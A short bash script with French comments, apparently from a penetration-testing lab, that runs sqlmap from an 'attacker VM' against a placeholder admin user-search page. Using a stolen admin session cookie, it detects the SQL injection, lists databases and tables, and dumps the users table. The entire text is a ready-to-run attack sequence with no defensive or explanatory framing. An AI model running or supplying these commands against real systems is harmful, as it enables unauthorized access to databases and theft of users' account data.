#!/bin/bash
# Approche sqlmap — depuis la VM attaquante
TARGET="http://<CIBLE>/admin/RechercheUtilisateur.php?nom=test"
COOKIE="PHPSESSID=<COOKIE_ADMIN>"

sqlmap -u "$TARGET" --cookie="$COOKIE" --batch
sqlmap -u "$TARGET" --cookie="$COOKIE" --dbs --batch
sqlmap -u "$TARGET" --cookie="$COOKIE" -D NOM_BASE --tables --batch
sqlmap -u "$TARGET" --cookie="$COOKIE" -D NOM_BASE -T users --dump --batch